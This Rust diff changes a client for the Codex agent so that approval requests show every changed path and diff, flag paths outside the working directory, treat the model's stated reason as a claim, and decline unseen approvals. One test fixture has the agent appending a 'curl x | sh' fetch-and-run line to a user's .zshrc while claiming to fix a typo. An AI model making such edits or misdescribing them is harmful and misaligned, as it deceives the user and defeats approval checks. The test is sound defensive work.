@@ -42,6 +42,19 @@ const ERRORS: &[&str] = &[
     "other",
 ];
 
+/// Why an approval was declined unseen: it named no command, or changes never announced.
+const UNSEEN: &str = "nothing to show";
+
+/// True if `path` is `cwd` or below it, part by part. A relative path is read from `cwd`; a `..`
+/// anywhere counts as outside.
+fn inside(cwd: &str, path: &str) -> bool {
+    let parts = |path: &str| -> Vec<String> {
+        path.split('/').filter(|part| !part.is_empty() && *part != ".").map(str::to_string).collect()
+    };
+    let path = if path.starts_with('/') { parts(path) } else { parts(&format!("{cwd}/{path}")) };
+    !path.iter().any(|part| part == "..") && path.starts_with(&parts(cwd))
+}
+
 /// The answer to a server request this client does not handle: JSON-RPC's "method not found".
 const NOT_HANDLED: i64 = -32601;
 
@@ -70,8 +83,12 @@ pub struct Codex {
     turn: Option<String>,
     /// Messages sent before the thread is ready.
     queued: Vec<Input>,
-    /// A file-change item's label, by its raw id, for its approval request.
-    files: BTreeMap<String, String>,
+    /// A file-change item's label and every change it makes, by its raw id, for its approval.
+    files: BTreeMap<String, (String, Value)>,
+    /// The working directory: a changed path outside it is flagged.
+    cwd: String,
+    /// An interrupt came before the turn had an id: sent when it has one.
+    interrupt_pending: bool,
 }
 
 impl Codex {
@@ -97,6 +114,8 @@ impl Codex {
             turn,
             queued: Vec::new(),
             files: BTreeMap::new(),
+            cwd: cwd.to_string(),
+            interrupt_pending: false,
         })
     }
 
@@ -118,6 +137,12 @@ impl Codex {
         let asked = self.asked.remove(&id);
         if message.get("error").is_some() {
             out.events.push(Event::Error { kind: "request_failed".into(), retrying: false });
+            // No thread or no turn: the messages waiting for one end here, as a failed turn.
+            let lost = !std::mem::take(&mut self.queued).is_empty();
+            if asked == Some(Asked::Turn) || (lost && matches!(asked, Some(Asked::Initialize | Asked::Thread))) {
+                self.interrupt_pending = false;
+                out.events.push(Event::TurnFinished { outcome: Outcome::Failed { kind: "request_failed".into() } });
+            }
             return;
         }
         let result = &message["result"];
@@ -139,9 +164,18 @@ impl Codex {
             Some(Asked::Turn) => {
                 if let Some(turn) = result["turn"]["id"].as_str() {
                     self.turn.get_or_insert_with(|| turn.to_string());
+                    self.interrupt_if_pending(out);
                 }
             }
             Some(Asked::Other) | None => {}
+        }
+    }
+
+    /// Sends the interrupt that waited for this turn's id.
+    fn interrupt_if_pending(&mut self, out: &mut Output) {
+        if let (true, Some(thread), Some(turn)) = (self.interrupt_pending, self.thread.clone(), self.turn.clone()) {
+            self.interrupt_pending = false;
+            out.replies.push(self.request("turn/interrupt", json!({"threadId": thread, "turnId": turn}), Asked::Other));
         }
     }
 
@@ -152,10 +186,12 @@ impl Codex {
         match method {
             "turn/started" if ours => {
                 self.turn = params["turn"]["id"].as_str().map(str::to_string);
-                emit.push(Event::TurnStarted);
+                out.events.push(Event::TurnStarted);
+                self.interrupt_if_pending(out);
             }
             "turn/completed" if ours => {
                 self.turn = None;
+                self.interrupt_pending = false;
                 let turn = &params["turn"];
                 let outcome = match turn["status"].as_str() {
                     Some("completed") => Outcome::Completed,
@@ -168,6 +204,9 @@ impl Codex {
                 emit.push(Event::TextDelta { text: Untrusted::new(params["delta"].as_str().unwrap_or(""), MAX_TEXT) })
             }
             "item/started" => self.item_started(&params["item"], emit),
+            "item/fileChange/patchUpdated" => {
+                self.remember(params["itemId"].as_str().unwrap_or(""), None, &params["changes"])
+            }
             "item/completed" => item_completed(&params["item"], ours, emit),
             "thread/tokenUsage/updated" if ours => {
                 let usage = &params["tokenUsage"];
@@ -184,7 +223,7 @@ impl Codex {
             "serverRequest/resolved" => {
                 let id = params["requestId"].clone();
                 if id.is_string() || id.is_i64() {
-                    emit.push(Event::PermissionClosed { ticket: Ticket { id, kind: TicketKind::Closed } });
+                    emit.push(Event::PermissionClosed { ticket: Ticket::new(id, TicketKind::Closed) });
                 }
             }
             // Ours, already read, or another thread's.
@@ -201,35 +240,75 @@ impl Codex {
 
     fn item_started(&mut self, item: &Value, emit: &mut Vec<Event>) {
         let Some((tool, station, label, detail)) = describe(item) else { return };
-        let raw = item["id"].as_str().unwrap_or("");
-        if item["type"] == "fileChange" && !raw.is_empty() {
-            if self.files.len() >= MAX_FILES {
-                self.files.pop_first();
-            }
-            self.files.insert(raw.to_string(), label.clone());
+        if item["type"] == "fileChange" {
+            self.remember(item["id"].as_str().unwrap_or(""), Some(&label), &item["changes"]);
         }
         let Some(id) = opaque(&item["id"]) else { return };
         // A sub-agent thread's calls count too. Codex names no parent call, so none is given.
         emit.push(Event::ToolStart { id, parent: None, tool, station, label, detail });
     }
 
-    /// An approval the user answers, or any other request, refused at once.
+    /// Keeps a file-change item's changes until its approval. A patch update (`label` `None`)
+    /// replaces the changes of an item already kept.
+    fn remember(&mut self, raw: &str, label: Option<&str>, changes: &Value) {
+        let label = match (label, self.files.get(raw)) {
+            (Some(label), _) => label.to_string(),
+            (None, Some((label, _))) => label.clone(),
+            (None, None) => return,
+        };
+        if raw.is_empty() {
+            return;
+        }
+        if self.files.len() >= MAX_FILES && !self.files.contains_key(raw) {
+            self.files.pop_first();
+        }
+        self.files.insert(raw.to_string(), (label, changes.clone()));
+    }
+
+    /// What a file-change approval approves: every changed path, one a line, those outside the
+    /// working directory flagged; a root the agent asks to write under; then each diff.
+    fn file_payload(&self, changes: &Value, grant_root: Option<&str>) -> String {
+        let changes = changes.as_array().map(Vec::as_slice).unwrap_or_default();
+        let mut payload = String::new();
+        for change in changes {
+            let path = change["path"].as_str().unwrap_or("(no path)");
+            let flag = if inside(&self.cwd, path) { "" } else { "   [outside the working directory]" };
+            payload.push_str(&format!("{path}{flag}\n"));
+        }
+        if let Some(root) = grant_root {
+            payload.push_str(&format!("and any write under {root} for the rest of the session\n"));
+        }
+        for change in changes {
+            // Past the cap the request is denied anyway: stop building.
+            if payload.len() > crate::MAX_APPROVABLE {
+                break;
+            }
+            payload.push_str(&format!("\n{}\n", change["diff"].as_str().unwrap_or("")));
+        }
+        payload
+    }
+
+    /// An approval the user answers, or any other request, refused at once. What is approved
+    /// comes from the request's payload; `reason` is the model's claim, kept apart.
     fn server_request(&mut self, id: Value, method: &str, params: &Value, out: &mut Output) {
-        let (tool, station, label, detail) = match method {
+        let claim = params["reason"].as_str().unwrap_or("");
+        let ask = match method {
             "item/commandExecution/requestApproval" => {
                 let command = params["command"].as_str().unwrap_or("");
                 let (station, label) = station::describe_command(command);
-                let shown = if command.is_empty() { params["reason"].as_str().unwrap_or("") } else { command };
-                ("exec", station, label, shown)
+                // The command and where it runs. No command: nothing to show, nothing to approve.
+                let cwd = params["cwd"].as_str().map(|cwd| format!("\nin {cwd}")).unwrap_or_default();
+                let always = Some(command.to_string());
+                (!command.is_empty()).then(|| ("exec", station, label, format!("{command}{cwd}"), always))
             }
             "item/fileChange/requestApproval" => {
-                let label = params["itemId"].as_str().and_then(|item| self.files.get(item)).cloned();
-                (
-                    "apply_patch",
-                    Station::Files,
-                    label.unwrap_or_else(|| "file".into()),
-                    params["reason"].as_str().unwrap_or(""),
-                )
+                let item = params["itemId"].as_str().and_then(|item| self.files.get(item)).cloned();
+                item.map(|(label, changes)| {
+                    let payload = self.file_payload(&changes, params["grantRoot"].as_str());
+                    // `acceptForSession`: later changes to the same files.
+                    let paths: Vec<&str> = payload.lines().take_while(|line| !line.is_empty()).collect();
+                    ("apply_patch", Station::Files, label, payload.clone(), Some(paths.join("\n")))
+                })
             }
             _ => {
                 let error =
@@ -239,13 +318,18 @@ impl Codex {
                 return;
             }
         };
-        out.events.push(Event::Permission {
-            ticket: Ticket { id, kind: TicketKind::Codex },
-            tool: tool.into(),
-            station,
-            label,
-            detail: Untrusted::new(detail, MAX_DETAIL),
-        });
+        let decline = json!({"id": id, "result": {"decision": "decline"}}).to_string();
+        let Some((tool, station, label, payload, always)) = ask else {
+            out.replies.push(decline);
+            out.events.push(Event::AutoDenied { tool: method_kind(method), label: String::new(), reason: UNSEEN });
+            return;
+        };
+        let ask = crate::Ask { tool: tool.into(), station, label, payload: &payload, claim, always };
+        let event = ask.event(Ticket::new(id, TicketKind::Codex));
+        if matches!(event, Event::AutoDenied { .. }) {
+            out.replies.push(decline);
+        }
+        out.events.push(event);
     }
 }
 
@@ -364,6 +448,8 @@ impl Protocol for Codex {
             Input::Interrupt => {
                 self.queued.clear();
                 let (Some(thread), Some(turn)) = (self.thread.clone(), self.turn.clone()) else {
+                    // A turn asked for and not named yet: interrupted as soon as its id comes.
+                    self.interrupt_pending = self.asked.values().any(|asked| *asked == Asked::Turn);
                     return Ok(Vec::new());
                 };
                 Ok(vec![self.request("turn/interrupt", json!({"threadId": thread, "turnId": turn}), Asked::Other)])
@@ -431,6 +517,76 @@ mod tests {
         let out = codex.read(r#"{"id":7,"method":"item/tool/requestUserInput","params":{}}"#);
         assert_eq!(sent(&out.replies[0])["error"]["code"], NOT_HANDLED);
         assert_eq!(sent(&out.replies[0])["id"], 7);
+    }
+
+    /// A file change shows every path it touches, flags those outside the working directory, and
+    /// keeps the model's `reason` apart as a claim. Changes never announced: declined unseen.
+    #[test]
+    fn a_file_change_shows_every_path_and_the_reason_only_as_a_claim() {
+        let mut codex = codex();
+        let changes = json!([
+            {"path": "/work/app/src/a.rs", "kind": {"type": "update"}, "diff": "@@ -1 +1 @@\n-a\n+b"},
+            {"path": "src/b.rs", "kind": {"type": "add"}, "diff": "+new"},
+            {"path": "/Users/me/.zshrc", "kind": {"type": "update"}, "diff": "+curl x | sh"}
+        ]);
+        let item = json!({"method": "item/started", "params": {"threadId": UUID, "turnId": "t", "startedAtMs": 1,
+            "item": {"type": "fileChange", "id": "f1", "status": "inProgress", "changes": changes}}});
+        codex.read(&item.to_string());
+        let ask = json!({"id": 9, "method": "item/fileChange/requestApproval", "params": {"itemId": "f1",
+            "threadId": UUID, "turnId": "t", "startedAtMs": 2, "reason": "Just fixing a typo in a.rs"}});
+        let out = codex.read(&ask.to_string());
+        let Some(Event::Permission { detail, claim, always, .. }) = out.events.first().cloned() else {
+            panic!("{out:?}")
+        };
+        let paths = "/work/app/src/a.rs\nsrc/b.rs\n/Users/me/.zshrc   [outside the working directory]";
+        assert!(detail.text().starts_with(paths), "{}", detail.text());
+        assert!(detail.text().contains("+curl x | sh") && !detail.text().contains("typo"));
+        assert_eq!((claim.text(), always.as_ref().map(Untrusted::text)), ("Just fixing a typo in a.rs", Some(paths)));
+        // An approval for changes it never announced, or a command it does not name: declined.
+        for params in [json!({"itemId": "unknown"}), json!({"itemId": "f1", "command": null})] {
+            let method = if params["command"].is_null() && params.get("command").is_some() {
+                "item/commandExecution/requestApproval"
+            } else {
+                "item/fileChange/requestApproval"
+            };
+            let out = codex.read(&json!({"id": 10, "method": method, "params": params}).to_string());
+            assert!(matches!(&out.events[..], [Event::AutoDenied { reason: "nothing to show", .. }]), "{out:?}");
+            assert_eq!(sent(&out.replies[0]), json!({"id": 10, "result": {"decision": "decline"}}));
+        }
+        assert!(
+            inside("/work/app", "/work/app") && inside("/work/app", "./x") && !inside("/work/app", "/work/app-2/x")
+        );
+        assert!(!inside("/work/app", "src/../../etc") && !inside("/work/app", "/work/app/../x"));
+    }
+
+    /// An interrupt sent before the turn has an id is sent once it has one.
+    #[test]
+    fn an_early_interrupt_waits_for_the_turn_id() {
+        let mut codex = codex();
+        codex.thread = Some(UUID.into());
+        let start = codex.write(Input::Send { text: "go".into(), images: vec![] }).unwrap();
+        let id = sent(&start[0])["id"].clone();
+        assert_eq!(codex.write(Input::Interrupt), Ok(vec![]));
+        let out = codex.read(&json!({"id": id, "result": {"turn": {"id": "t9", "status": "inProgress"}}}).to_string());
+        assert_eq!(sent(&out.replies[0])["params"], json!({"threadId": UUID, "turnId": "t9"}));
+        // Idle: nothing waits.
+        let mut idle = super::tests::codex();
+        idle.thread = Some(UUID.into());
+        assert_eq!(idle.write(Input::Interrupt), Ok(vec![]));
+        assert!(!idle.interrupt_pending);
+    }
+
+    /// A thread that cannot start ends the messages waiting for it as a failed turn.
+    #[test]
+    fn a_failed_start_ends_the_waiting_turn() {
+        let mut codex = codex();
+        codex.opening();
+        codex.write(Input::Send { text: "hi".into(), images: vec![] }).unwrap();
+        codex.read(r#"{"id":0,"result":{}}"#);
+        let out = codex.read(r#"{"id":1,"error":{"code":-32000,"message":"no such thread"}}"#);
+        let failed = Event::TurnFinished { outcome: Outcome::Failed { kind: "request_failed".into() } };
+        assert_eq!(out.events.last(), Some(&failed));
+        assert!(codex.queued.is_empty());
     }
 
     #[test]
